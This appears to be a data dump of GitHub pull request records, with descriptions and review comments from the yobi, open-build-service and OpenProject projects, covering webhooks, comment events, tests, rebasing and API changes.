\xeb\xa7\x8c\xeb\x93\xa4\xec\x96\xb4\xec\xa7\x84\xea\xb2\x8c \xed\x95\x98\xeb\x82\x98 \xeb\x8d\x94 \xec\x9e\x88\xec\x96\xb4\xec\x84\x9c 104.sql\xec\x9d\xb4 \xec\xb6\xa9\xeb\x8f\x8c\xed\x95\x98\xeb\x84\xa4\xec\x9a\x94.\r\n\xeb\xa8\xb8\xec\xa7\x80\xed\x95\x9c \xed\x9b\x84 webhook\xec\x97\x90 \xed\x95\xb4\xeb\x8b\xb9\xed\x95\x98\xeb\x8a\x94 schema\xeb\xa5\xbc 105.sql\xeb\xa1\x9c \xec\x98\xae\xea\xb2\xa8\xec\x84\x9c conflict\xeb\xa5\xbc \xec\x9e\xa1\xec\x95\x84\xeb\x86\x93\xec\x95\x98\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. 3aa070f', 'webhook\xec\x9d\x84 \xeb\x93\xb1\xeb\xa1\x9d\xed\x95\xa0 \xeb\x95\x8c, Add webhook \xeb\xb2\x84\xed\x8a\xbc\xec\x9d\x84 \xed\x81\xb4\xeb\xa6\xad\xed\x95\x98\xec\xa7\x80 \xec\x95\x8a\xea\xb3\xa0 ctrl+enter\xeb\xa5\xbc \xeb\x88\x84\xeb\xa5\xb4\xeb\x8b\x88 2\xea\xb0\x9c\xea\xb0\x80 \xeb\x93\xb1\xeb\xa1\x9d\xeb\x90\x98\xeb\x8a\x94 \xeb\xb2\x84\xea\xb7\xb8\xea\xb0\x80 \xec\x9e\x88\xeb\x84\xa4\xec\x9a\x94.', '@npcode\r\nhttps://github.com/naver/yobi/blob/next/app/views/common/scripts.scala.html#L113\r\nCtrl+Enter\xea\xb0\x80 form submit\xec\x9d\x98 \xec\x88\x8f\xec\xbb\xb7\xec\x9c\xbc\xeb\xa1\x9c \xec\xa0\x95\xec\x9d\x98\xea\xb0\x80 \xeb\x90\x98\xec\x96\xb4\xec\x9e\x88\xeb\x8a\x94\xeb\x8d\xb0, form \xec\x9e\x90\xec\xb2\xb4\xeb\x8f\x84 enter key\xeb\xa5\xbc \xeb\x88\x84\xeb\xa5\xb4\xeb\xa9\xb4 submit\xec\x9d\x84 \xed\x95\x98\xea\xb8\xb0 \xeb\x95\x8c\xeb\xac\xb8\xec\x97\x90 \xeb\x91\x90 \xed\x82\xa4 \xec\x9e\x85\xeb\xa0\xa5\xec\x97\x90 \xeb\x8c\x80\xed\x95\x9c \xeb\xb0\x98\xec\x9d\x91\xec\x9d\xb4 enter\xec\x97\x90 \xec\x9d\x98\xed\x95\xb4 \xec\xa4\x91\xeb\xb3\xb5\xeb\x90\x98\xec\x96\xb4 \xeb\x93\xa4\xec\x96\xb4\xea\xb0\x80\xeb\x8a\x94 \xea\xb2\x83 \xea\xb0\x99\xeb\x84\xa4\xec\x9a\x94.\r\nCtrl+Enter\xeb\xa5\xbc \xed\x95\x98\xeb\x82\x98\xec\x9d\x98 keyCode(`e.keycode == 10`)\xec\x9c\xbc\xeb\xa1\x9c \xeb\xb0\x9b\xeb\x8a\x94 \xeb\xb8\x8c\xeb\x9d\xbc\xec\x9a\xb0\xec\xa0\x80\xec\x97\x90\xec\x84\x9c\xeb\x8a\x94 \xeb\xac\xb8\xec\xa0\x9c\xea\xb0\x80 \xec\x97\x86\xec\x9d\x84 \xea\xb2\x83 \xea\xb0\x99\xea\xb3\xa0, \xeb\x94\xb0\xeb\xa1\x9c \xeb\xb0\x9b\xeb\x8a\x94(`e.keyCode == 13 && e.ctrlKey`) \xeb\xb8\x8c\xeb\x9d\xbc\xec\x9a\xb0\xec\xa0\x80\xec\x9d\x98 \xea\xb2\xbd\xec\x9a\xb0 \xeb\xac\xb8\xec\xa0\x9c\xea\xb0\x80 \xec\x9e\x88\xeb\x8a\x94 \xea\xb2\x83 \xea\xb0\x99\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xec\x9d\xbc\xeb\x8b\xa8 keycode 13\xec\x9c\xbc\xeb\xa1\x9c \xec\x9e\x85\xeb\xa0\xa5\xec\x9d\x84 \xeb\xb0\x9b\xec\x9d\x84 \xec\x8b\x9c Ctrl\xec\x9d\xb4 \xed\x95\xa8\xea\xbb\x98 \xeb\x93\xa4\xec\x96\xb4\xec\x99\x94\xeb\x8a\x94\xec\xa7\x80 \xed\x99\x95\xec\x9d\xb8\xed\x95\x98\xea\xb3\xa0 \xed\x95\xa8\xea\xbb\x98 \xeb\x93\xa4\xec\x96\xb4\xec\x98\xa8 \xea\xb2\xbd\xec\x9a\xb0 \xeb\xac\xb4\xec\x8b\x9c\xed\x95\x98\xeb\x8a\x94(\xea\xb8\xb0\xeb\xb3\xb8 shortcut \xec\x9d\xb4\xeb\xb2\xa4\xed\x8a\xb8\xec\x97\x90 \xeb\xa7\xa1\xea\xb8\xb0\xeb\x8a\x94) \xeb\xb0\xa9\xec\x8b\x9d\xec\x9c\xbc\xeb\xa1\x9c \xec\xb2\x98\xeb\xa6\xac\xed\x95\x98\xea\xb2\xa0\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.\r\n7b2ac0d', '---- \xec\x97\xac\xea\xb8\xb0\xea\xb9\x8c\xec\xa7\x80 \xeb\xa6\xac\xeb\xb7\xb0 \xeb\xb0\x98\xec\x98\x81\xec\x9d\x84 \xec\x99\x84\xeb\xa3\x8c\xed\x96\x88\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.', '\xed\x9d\xac\xed\x95\x9c\xed\x95\x98\xea\xb2\x8c hook \xec\x9a\x94\xec\xb2\xad\xec\x9d\x98 Content-Type\xec\x9d\xb4 json\xec\x9d\xb8\xeb\x8d\xb0\xeb\x8f\x84 charset \xed\x8c\x8c\xeb\x9d\xbc\xeb\xa9\x94\xed\x84\xb0\xea\xb0\x80 \xeb\xb6\x99\xec\x96\xb4\xec\x9e\x88\xeb\x84\xa4\xec\x9a\x94.\r\n\r\n> Content-Type: application/json; charset=utf-8\r\n\r\napplication/json\xec\x97\x90\xeb\x8a\x94 charset \xed\x8c\x8c\xeb\x9d\xbc\xeb\xa9\x94\xed\x84\xb0\xea\xb0\x80 \xec\xa0\x95\xec\x9d\x98\xeb\x90\x98\xec\x96\xb4\xec\x9e\x88\xec\xa7\x80 \xec\x95\x8a\xec\x95\x84\xec\x84\x9c [1] \xec\x97\x86\xeb\x8a\x94 \xed\x8e\xb8\xec\x9d\xb4 \xeb\x82\x98\xec\x9d\x84\xed\x85\x90\xeb\x8d\xb0... \xec\x9d\xb4\xea\xb1\xb4 WS \xeb\x9d\xbc\xec\x9d\xb4\xeb\xb8\x8c\xeb\x9f\xac\xeb\xa6\xac\xec\x9d\x98 \xec\x9e\x98\xeb\xaa\xbb\xec\x9d\xb8 \xea\xb2\x83 \xea\xb0\x99\xec\x9c\xbc\xeb\x8b\x88 \xea\xb7\xb8\xeb\x83\xa5 \xeb\x84\x98\xec\x96\xb4\xea\xb0\x80\xec\x95\xbc\xea\xb2\xa0\xeb\x84\xa4\xec\x9a\x94.\r\n\r\n[1]: http://tools.ietf.org/html/rfc7158#section-11', '\xec\xbd\x94\xeb\xa9\x98\xed\x8a\xb8 \xea\xb0\x90\xec\x82\xac\xeb\x93\x9c\xeb\xa6\xbd\xeb\x8b\x88\xeb\x8b\xa4. \xed\x98\xb9\xec\x8b\x9c \xeb\x8b\xa4\xeb\xa5\xb8 \xeb\xa6\xac\xeb\xb7\xb0 \xec\x82\xac\xed\x95\xad\xec\x9d\xb4 \xeb\x8d\x94 \xec\x9e\x88\xec\x9c\xbc\xec\x8b\x9c\xeb\xa9\xb4, \xeb\xaf\xb8\xeb\xa6\xac \xeb\x8c\x93\xea\xb8\x80\xec\x9d\x84 \xeb\x82\xa8\xea\xb2\xa8\xec\xa3\xbc\xec\x8b\xa4 \xec\x88\x98 \xec\x9e\x88\xeb\x82\x98\xec\x9a\x94? \xea\xb3\x84\xec\x86\x8d\xed\x95\xb4\xec\x84\x9c \xeb\xb0\x98\xec\x98\x81\xed\x95\x98\xeb\x8f\x84\xeb\xa1\x9d \xed\x95\x98\xea\xb2\xa0\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.', '@insanehong \xed\x94\x84\xeb\xa1\xa0\xed\x8a\xb8\xec\x97\x94\xeb\x93\x9c \xec\xbd\x94\xeb\x93\x9c\xec\xa2\x80 \xeb\xb4\x90\xec\xa3\xbc\xec\x8b\x9c\xea\xb2\xa0\xec\x96\xb4\xec\x9a\x94?', '3cc38fc \xec\x97\x90\xec\x84\x9c hook object\xeb\xa5\xbc \xec\x88\x98\xec\xa0\x95\xed\x95\xb4\xeb\x86\x93\xec\x95\x98\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.\r\nGitHub\xec\x99\x80 \xec\xb5\x9c\xeb\x8c\x80\xed\x95\x9c \xeb\xb9\x84\xec\x8a\xb7\xed\x95\x9c \xed\x98\x95\xed\x83\x9c\xeb\xa1\x9c \xea\xb0\x80\xeb\xa0\xa4 \xed\x96\x88\xec\x9c\xbc\xeb\x82\x98 JGit\xec\x9c\xbc\xeb\xa1\x9c\xeb\xb6\x80\xed\x84\xb0 \xec\xa0\x84\xeb\x8b\xac\xeb\xb0\x9b\xea\xb8\xb0 \xed\x9e\x98\xeb\x93\xa0 \xeb\x8d\xb0\xec\x9d\xb4\xed\x84\xb0\xea\xb0\x80 \xec\x9e\x88\xeb\x8a\x94 \xeb\x93\xb1 \xea\xb5\xac\xed\x98\x84\xec\x9d\xb4 \xed\x9e\x98\xeb\x93\xa0 \xeb\xb6\x80\xeb\xb6\x84\xec\x9d\x84 \xec\xa0\x9c\xec\x99\xb8\xed\x95\x98\xea\xb3\xa0 \xed\x95\x84\xec\x9a\x94\xed\x95\x9c \xec\x9a\x94\xec\x86\x8c\xeb\xa7\x8c\xec\x9d\x84 \xec\x9a\xb0\xec\x84\xa0\xec\xa0\x81\xec\x9c\xbc\xeb\xa1\x9c \xea\xb5\xac\xed\x98\x84\xed\x96\x88\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xeb\x98\x90\xed\x95\x9c, branch \xec\x97\xac\xeb\x9f\xac\xea\xb0\x9c\xeb\xa5\xbc \xed\x95\x9c \xeb\xb2\x88\xec\x97\x90 push\xed\x95\x98\xeb\x8a\x94 \xea\xb2\xbd\xec\x9a\xb0\xea\xb0\x80 \xec\x9e\x88\xec\x96\xb4 `ref` property\xec\x97\x90\xeb\x8a\x94 string\xec\x9d\xb4 \xec\x95\x84\xeb\x8b\x8c string array\xeb\xa5\xbc \xeb\x8c\x80\xec\x8b\xa0 JSON object\xec\x97\x90 \xeb\x8b\xac\xec\x95\x98\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. (ad2c8b1 \xec\x9d\x98 \xec\x97\x85\xeb\x8d\xb0\xec\x9d\xb4\xed\x8a\xb8\xeb\x90\x9c \xeb\x8f\x84\xed\x81\x90\xeb\xa8\xbc\xed\x8a\xb8\xeb\xa5\xbc \xec\xb0\xb8\xea\xb3\xa0\xed\x95\xb4\xec\xa3\xbc\xec\x84\xb8\xec\x9a\x94) \xec\x9d\xb4\xeb\xa0\x87\xea\xb2\x8c branch \xec\x97\xac\xeb\x9f\xac\xea\xb0\x9c\xeb\xa5\xbc push\xed\x95\x98\xeb\x8a\x94 \xea\xb2\xbd\xec\x9a\xb0\xec\x97\x90\xeb\x8a\x94 head_commit\xec\x9d\x84 \xec\x96\xb4\xeb\x96\xa4 \xea\xb2\x83\xec\x9c\xbc\xeb\xa1\x9c \xec\xa7\x80\xec\xa0\x95\xed\x95\xa0\xec\xa7\x80 \xec\x95\xa0\xeb\xa7\xa4\xed\x95\xb4\xec\xa7\x80\xeb\x8a\x94 \xeb\xac\xb8\xec\xa0\x9c \xeb\x98\x90\xed\x95\x9c \xec\x9e\x88\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4\xeb\xa7\x8c, \xed\x98\x84\xec\x9e\xac policy\xeb\x8a\x94 \xeb\xb0\x9b\xec\x9d\x80 \xec\xbb\xa4\xeb\xb0\x8b \xec\xa4\x91 \xea\xb0\x80\xec\x9e\xa5 \xec\xb5\x9c\xea\xb7\xbc\xec\x9d\x98 \xec\xbb\xa4\xeb\xb0\x8b(\xec\xa6\x89 \xec\xbb\xa4\xeb\xb0\x8b \xeb\xa6\xac\xec\x8a\xa4\xed\x8a\xb8 \xec\xa4\x91 \xea\xb0\x80\xec\x9e\xa5 \xec\x95\x9e)\xec\x9d\x84 head_commit\xec\x9c\xbc\xeb\xa1\x9c \xec\xa0\x95\xed\x95\x98\xeb\x8a\x94 \xea\xb2\x83\xec\x9c\xbc\xeb\xa1\x9c \xeb\x91\x90\xec\x97\x88\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \r\n\r\n\xeb\xa6\xac\xeb\xb7\xb0 \xeb\xb6\x80\xed\x83\x81\xeb\x93\x9c\xeb\xa6\xac\xea\xb2\xa0\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xea\xb0\x90\xec\x82\xac\xed\x95\xa9\xeb\x8b\x88\xeb\x8b\xa4.', '\xeb\xb0\x98\xec\x98\x81\xed\x95\xb4\xec\x95\xbc \xed\x95\xa0 \xeb\x8b\xa4\xeb\xa5\xb8 \xec\x82\xac\xed\x95\xad\xec\x9d\xb4 \xeb\x8d\x94 \xec\x9e\x88\xeb\x82\x98\xec\x9a\x94?', '--- \xec\x97\xac\xea\xb8\xb0\xea\xb9\x8c\xec\xa7\x80 \xeb\xa6\xac\xeb\xb7\xb0 \xeb\xb0\x98\xec\x98\x81\xec\x9d\x84 \xec\x99\x84\xeb\xa3\x8c\xed\x95\x98\xec\x98\x80\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.\r\n@npcode @insanehong ', '@insanehong \xeb\xac\xb8\xec\xa0\x9c\xec\x97\x86\xec\x96\xb4\xeb\xb3\xb4\xec\x9d\xb4\xeb\xa9\xb4 \xec\x95\x8c\xeb\xa0\xa4\xec\xa3\xbc\xec\x84\xb8\xec\x9a\x94. \xed\x94\x84\xeb\xa1\xa0\xed\x8a\xb8\xec\x97\x94\xeb\x93\x9c\xec\x97\x90 \xeb\xac\xb8\xec\xa0\x9c\xec\x97\x86\xec\x9c\xbc\xeb\xa9\xb4 \xeb\xa8\xb8\xec\xa7\x80\xed\x95\xa0\xea\xb2\x8c\xec\x9a\x94.', '![git push test 0027-06-17 18-47-17](https://cloud.githubusercontent.com/assets/1558742/8204176/be49e8a6-1521-11e5-92a6-afd9b009318d.jpg)\r\n\r\n\r\n1. \xec\x9c\x84 \xea\xb7\xb8\xeb\xa6\xbc\xec\x97\x90\xec\x84\x9c\xec\xb2\x98\xeb\x9f\xbc screen width 1024 \xec\x97\x90\xec\x84\x9c \xeb\xa0\x88\xec\x9d\xb4\xec\x95\x84\xec\x9b\x83\xec\x9d\xb4 \xea\xb9\xa8\xec\xa7\x91\xeb\x8b\x88\xeb\x8b\xa4. 1024 \xea\xb9\x8c\xec\xa7\x80\xeb\x8a\x94 \xeb\xa0\x88\xec\x9d\xb4\xec\x95\x84\xec\x9b\x83\xec\x9d\xb4 \xea\xb9\xa8\xec\xa7\x80\xeb\xa9\xb4 \xec\x95\x88\xeb\x90\xa9\xeb\x8b\x88\xeb\x8b\xa4. \r\n\xea\xb4\x80\xeb\xa0\xa8\xed\x95\xb4\xec\x84\x9c \xeb\xa9\x94\xeb\x89\xb4\xec\x97\x90\xeb\x8a\x94 `\xec\x9b\xb9 \xed\x9b\x84\xed\x81\xac` \xeb\x9d\xbc\xeb\x8a\x94\xea\xb2\x83\xeb\xa7\x8c \xeb\xaa\x85\xec\x8b\x9c\xed\x95\x98\xea\xb3\xa0 \xea\xb4\x80\xeb\xa0\xa8 \xec\x84\xa4\xeb\xaa\x85\xec\x9d\x80 \xed\x95\xb4\xeb\x8b\xb9 \xed\x8e\x98\xec\x9d\xb4\xec\xa7\x80\xec\x97\x90 \xeb\x93\xa4\xec\x96\xb4\xea\xb0\x94\xec\x9d\x84\xeb\x95\x8c \xed\x95\x98\xeb\x8a\x94\xea\xb2\x8c \xec\xa2\x8b\xec\x9d\x84\xea\xb1\xb0 \xea\xb0\x99\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4.  \xec\x95\x84\xec\x95\x84\xeb\x9e\x98\xec\x9d\x98 \xec\x9d\xb4\xeb\xaf\xb8\xec\xa7\x80\xeb\xa5\xbc \xec\xb0\xb8\xea\xb3\xa0\xed\x95\x98\xec\x8b\x9c\xeb\xa9\xb4 \xeb\x90\xa0\xea\xb2\x83 \xea\xb0\x99\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xed\x95\xb4\xeb\x8b\xb9 \xed\x99\x94\xeb\xa9\xb4\xec\x9d\x80 \xed\x94\x84\xeb\xa1\x9c\xec\xa0\x9d\xed\x8a\xb8 \xec\x9d\xb4\xea\xb4\x80\xeb\xa9\x94\xeb\x89\xb4\xec\x97\x90\xec\x84\x9c \xeb\xb3\xb4\xec\x8b\xa4\xec\x88\x98 \xec\x9e\x88\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \r\n![image](https://cloud.githubusercontent.com/assets/1558742/8204299/846d7674-1522-11e5-92a4-6efdc0aeac83.png)\r\n\r\n2. \xed\x95\x9c\xea\xb8\x80\xec\x84\xa4\xec\xa0\x95\xec\x9d\x84 \xed\x95\xb4\xeb\x85\xbc \xec\x83\x81\xed\x83\x9c\xec\x97\x90\xec\x84\x9c \xeb\xa9\x94\xec\x84\xb8\xec\xa7\x80\xea\xb0\x80 \xec\x98\x81\xec\x96\xb4\xeb\xa1\x9c\xeb\xa7\x8c \xeb\x82\x98\xec\x98\xa4\xea\xb3\xa0 \xec\x9e\x88\xeb\x84\xa4\xec\x9a\x94.\r\n3. \xed\x85\x8c\xec\x9d\xb4\xeb\xb8\x94 \xec\xa0\x95\xeb\xa0\xac\xec\x9d\x80 \xea\xb8\xb0\xec\xa1\xb4 ui \xec\x99\x80 \xed\x86\xb5\xec\x9d\xbc\xec\x84\xb1\xec\x9d\x84 \xeb\xa7\x9e\xec\xb6\xb0\xec\xa3\xbc\xec\x8b\x9c\xea\xb8\xb0 \xeb\xb0\x94\xeb\x9e\x8d\xeb\x8b\x88\xeb\x8b\xa4. \r\n4. \xec\x95\x84\xeb\x9e\x98\xec\x9d\x98 \xea\xb7\xb8\xeb\xa6\xbc \xea\xb0\x99\xec\x9d\xb4 token \xea\xb0\x92\xec\x9d\xb4 \xea\xb8\xb4\xea\xb2\xbd\xec\x9a\xb0 \xeb\xa0\x88\xec\x9d\xb4\xec\x9b\x83\xec\x9d\xb4 \xea\xb9\xa8\xec\xa7\x91\xeb\x8b\x88\xeb\x8b\xa4. \xed\x86\xa0\xed\x81\xb0 \xea\xb0\x92\xec\x9d\xb4 \xea\xb8\xb4\xea\xb2\xbd\xec\x9a\xb0\xec\x97\x90 \xeb\x8c\x80\xed\x95\x9c \xec\xb2\x98\xeb\xa6\xac\xeb\xa5\xbc \xed\x95\x98\xec\xa3\xbc\xec\x85\x94\xec\x95\xbc \xed\x95\xa0\xea\xb1\xb0 \xea\xb0\x99\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \r\n\xea\xb4\x80\xeb\xa0\xa8\xed\x95\xb4\xec\x84\x9c url \xec\x9d\x98 \xea\xb2\xbd\xec\x9a\xb0\xeb\x8f\x84 \xeb\xb9\x84\xec\x8a\xb7\xed\x95\x9c \xeb\xac\xb8\xec\xa0\x9c\xea\xb0\x80 \xeb\xb0\x9c\xec\x83\x9d\xed\x95\xa0\xea\xb1\xb0 \xea\xb0\x99\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \r\n![git push test 0027-06-17 18-52-20](https://cloud.githubusercontent.com/assets/1558742/8204231/0eaad92c-1522-11e5-8e20-6ac892d82528.jpg)\r\n5. list \xeb\xb6\x80\xeb\xb6\x84\xec\x97\x90  border-top \xec\x9d\xb4 \xeb\x93\xa4\xec\x96\xb4\xea\xb0\x84\xea\xb1\xb0 \xea\xb0\x99\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xec\x95\x84\xeb\x9e\x98 \xed\x99\x94\xeb\xa9\xb4\xea\xb3\xbc \xea\xb0\x99\xec\x9d\xb4 \xed\x98\x84\xec\x9e\xac ui \xeb\x93\xa4\xec\x9d\x80 border-bottom \xec\x9d\xb4 \xeb\x93\xa4\xec\x96\xb4\xea\xb0\x80 \xec\x9e\x88\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \r\n![image](https://cloud.githubusercontent.com/assets/1558742/8204356/faf6bcc4-1522-11e5-9911-8b5fe919b7ef.png)\r\n', '@insanehong \r\n2\xeb\xb2\x88 \xea\xb4\x80\xeb\xa0\xa8\xed\x95\x98\xec\x97\xac\xec\x84\x9c\xeb\x8a\x94, \xeb\xa7\x88\xeb\x95\x85\xed\x95\x9c \xeb\xb2\x88\xec\x97\xad\xec\x9d\xb4 \xec\x83\x9d\xea\xb0\x81\xeb\x82\x98\xec\xa7\x80 \xec\x95\x8a\xec\x9d\x80 \xea\xb2\xbd\xec\x9a\xb0 `message-ko_KR`\xea\xb3\xbc `message-ja_JP`\xeb\xa5\xbc \xeb\xb9\x84\xec\x9b\x8c\xeb\x86\x93\xec\x95\x84\xec\x84\x9c \xeb\x8c\x80\xec\x8b\xa0 \xec\x98\x81\xeb\xac\xb8 \xeb\xa9\x94\xec\x8b\x9c\xec\xa7\x80\xea\xb0\x80 \xeb\x9c\xa8\xeb\x8a\x94 \xea\xb2\x83 \xea\xb0\x99\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xed\x95\x84\xec\x9a\x94\xed\x95\x98\xeb\x8b\xa4\xeb\xa9\xb4 \xea\xb5\xad\xeb\xac\xb8\xec\x9d\x98 \xea\xb2\xbd\xec\x9a\xb0 \xec\xa0\x81\xeb\x8b\xb9\xed\x95\x9c \xeb\xa9\x94\xec\x8b\x9c\xec\xa7\x80\xeb\xa5\xbc \xec\xb6\x94\xea\xb0\x80\xed\x95\x98\xea\xb2\xa0\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4\xeb\xa7\x8c, naive\xed\x95\x9c \xeb\xb2\x88\xec\x97\xad\xec\x9d\xb4 \xec\x98\xa4\xed\x9e\x88\xeb\xa0\xa4 \xea\xb8\xb0\xeb\x8a\xa5 \xec\x82\xac\xec\x9a\xa9\xec\x97\x90 \xec\xa7\x80\xec\x9e\xa5\xec\x9d\x84 \xec\xa4\x84\xea\xb9\x8c\xeb\xb4\x90 \xeb\xa7\x88\xec\x9d\x8c\xec\x97\x90 \xea\xb1\xb8\xeb\xa6\xac\xeb\x84\xa4\xec\x9a\x94. \r\n\xeb\x82\x98\xeb\xa8\xb8\xec\xa7\x80 \xeb\xb6\x80\xeb\xb6\x84\xec\x9d\x80 \xeb\xb0\x98\xec\x98\x81 \xed\x9b\x84 \xeb\x8b\xa4\xec\x8b\x9c \xec\xbd\x94\xeb\xa9\x98\xed\x8a\xb8 \xeb\x82\xa8\xea\xb8\xb0\xea\xb2\xa0\xec\x8a\xb5\xeb\x8b\x88\xeb\x8b\xa4. \xea\xb0\x90\xec\x82\xac\xed\x95\xa9\xeb\x8b\x88\xeb\x8b\xa4.']"
348,openSUSE/open-build-service,393.0,"Once a new comment is created, a new entry is created under Event table to be able to sent out to hermes.

Payload keys include - `project_name` (if), `package_name` (if), `request_id` (if), `comment` (body of the comment), `commenter` (name of the user making comment) and involved_users (list of users who have made comment under a $object type.).

Any feedback or comments are welcome.

Hermes template files are at - https://github.com/shayonj/hermes/commit/acb74f4671114573f2048610f72358f38b332cc0

Cheers!","['I have reworked the code structure.  As for putting `Webui::CommentsController#permission_check!` to blacklist, I will get back to it tomorow/monday and see how it can be fixed the best way :). Might need some rebasing at the end.', 'This is what I see in master:\r\n\r\ncoolo@goneril#api>flog -av app/controllers/webui/comments_controller.rb \r\n** flogging app/controllers/webui/comments_controller.rb\r\n   166.8: flog total\r\n    10.4: flog/method average\r\n\r\n    37.2: Webui::CommentsController#permission_check! app/controllers/webui/comments_controller.rb:70\r\n    36.5: Webui::CommentsController#sort_comments app/controllers/webui/comments_controller.rb:111\r\n', 'it was because of `require event/comment` in the controller. Fixed now. Interesting.', 'Not sure, why travis is failing. Passed for the one before this.', 'yeah, the search tests fail randomly since I updated the gem version. I need to debug this', '\n[![Coverage Status](https://coveralls.io/builds/1552089/badge)](https://coveralls.io/builds/1552089)\n\nCoverage increased (+5.58%) when pulling **5a4db4efdf1e5f007601f2e84f4731f38c64a67f on shayonj:master** into **c37b728d2b669dabe1da0befdf67553f32f09aa7 on openSUSE:master**.\n']"
349,opf/openproject,442.0,"Implements [ticket 1987](https://www.openproject.org/issues/1987)

:exclamation: This PR contains #441","['There are still remains of issue permissions, e.g.:\r\n* view_issues\r\n* edit_issue\r\n* add_issue\r\n\r\nCould you please double check for all removed permissions, and remove/replace what comes up.\r\n']"
350,opf/openproject,1053.0,"- Added tests and specs for bug #4928
- Examined bug
  - Added debug output to examine event contents
  - Examined journals
- Added highlight_first helper
  - Used last_journal instead of #journals.last
  - Fixed Journalized#last_journal to work when eager loading messed up search
  - Fixed how journals are sorted when they are loaded (by version instead
    of created_at)
- Added notes anchor when required
  - Added notes anchor when required
  - Note anchor uses version of journal note itself, not version of work package
- Fixed failed test in
  functional/wiki_controlller_test.rb:WikiControllerTest
  #test_update_stale_page_should_not_raise_an_error
- Fixed failed specs.
- Converted search helper test -> spec, removed test file.
- Re-factored regexps in search controller, covered them with specs.
- Temporary added job for travis to run isolated suite
  work_package_activity_provider_spec
- Suite work_package_activity_provider_spec ran successfully - removed note and job.",[]
351,opf/openproject,1166.0,[``* `#4019` Sorting tables resets keyboard focus``](https://www.openproject.org/work_packages/4019),"['@hschink there are no tests for the Angular controllers and directives at present. would you consider adding tests?', ""Looks pretty awesome to me considering this is your first angular code @hschink \r\n\r\nExcept for tiny details I'd like to merge this /cc @manwithtwowatches @myabc "", '@hschink excellent PR! :green_heart:  Note: most of my comments relate to minor details that do not need to be dealt with immediately.']"
352,opf/openproject,1346.0,"Many Cucumber features were broken as a result of the styling change
introduced in fc47355. Cukes should test behaviour and semantics,
_not styling_. `text-transform: uppercase` does not convey semantic
meaning in the context of these particular headings.

Selenium will match text as it is rendered and visible to the
end-user. Thus, by default, we need to make the text matching in the
""should (not) see"" step definitions less strict.","[':+1: we should have done this at once', '@tilt it took me some time to realise that fc473559 (and I think also a56b0e77b) caused the changes. too long\xe2\x80\xa6', 'Come on Travis']"
353,opf/openproject,1524.0,https://www.openproject.org/work_packages/11934,[':+1: ']
354,opf/openproject,1548.0,,"['@mtakac this should have tests', '@myabc I agree but I want to finish and merge in some more features. I will add many tests next week.', ""I don't know why GitHub (again) displays the incorrect diff."", ""```\r\ngit log --oneline dev..feature/api-activities-create-show-endpoint \r\n\r\nb821ab7 Merge branch 'feature/api-activities-create-show-endpoint' of github.com:opf/openproject into feature/api-activities-create-show-endpoint\r\n2d4e1e8 Created a show activity API endpoint\r\n143aba3 Changed some activity properties\r\n727dc12 Created a show activity API endpoint\r\nc91dab4 Changed some activity properties\r\n```"", 'I have rebased the branch.', '@mtakac PLEASE REBASE YOUR BRANCH\r\n\r\n```\r\n143aba3 Changed some activity properties\r\n2d4e1e8 Created a show activity API endpoint\r\nc91dab4 Changed some activity properties\r\n727dc12 Created a show activity API endpoint\r\n1d3506a Changed some activity properties\r\n7c2c69c Created a show activity API endpoint\r\n823eb7d Added spec for API activity representer\r\n7d3205e Fixed typo\r\n```', 'force pushing again']"
355,opf/openproject,1641.0,,"['@hschink looks like the Karma tests are failing.', '@myabc Sorry, not my branch (ATM). :smile: I talked to @mtakac about this.', '@mtakac I miss some tests for the new API endpoints and I guess you need to rebase the branch again.', '@hschink thanks for the rebase/tidy up!', ""@myabc You're welcome!"", '@mtakac, @myabc I rebased the branch.', 'Rebased. Should now be mergeable.']"
356,opf/openproject,1657.0,[``* `#14433` Long version names with long wiki name destroys layout``](https://www.openproject.org/work_packages/14433),['Works as advertised and can be merged as soon as Travis is done.']
357,opf/openproject,1764.0,"We have vendored jstoolbar translation as separate javascript files.

This PR aims to manage the jstoolbar translations with regular I18n to make them equal with all our other translations. This lets us add jstoolbar translations with crowdin \o/","['Now, I18n-js is used to get the translations.', ':+1: ']"
358,opf/openproject,1884.0,"[``* `#8747`keyboard shortcuts and help not working on workpackage list``](http://www.openproject.org/work_packages/8747)

@ulferts @myabc I decided to add another class for speed purposes instead of a data attribute ( I think it's faster than through some [data-list='true'] selector).","[""I've prepared a stage. <a href='http://0xf013-feature-8747-keyboard-shortcuts-and-help-not-working-on-.opf-openproject-2af22bf12c7dfdad4ddf.ttrcloud.com' target='_blank'>Click to open.</a>""]"
359,opf/openproject,1886.0,"Allow disabling rewiring - this exposes parent IDs of work packages invisible
to the user.
When requesting single work packages via IDs, the rewiring fails as it assumes
that all visible work packages are loaded, which they might not be. For a work
package with a parent visible to the user, but not included in the requested IDs,
the parent_id would thus be nil.
Disabling rewiring allows fetching work packages with their parent_ids
even when the parents are not included in the list of requested work packages.

There's also a case when rewiring is not used at all: When not providing a project
id and requesting via /api/v2/planning_elements.json?ids=[...]. In this case
parent_ids were and are always shown. This is pretty inconsistent, but that's
the way API v2 is. Btw, planning_elements.json returns 404 when not giving an ids
parameter.

Apparently, the way custom fields are returned is also different between
the general planning elements endpoint and the project-specific one. I didn't
look into this, though.

https://www.openproject.org/work_packages/15243

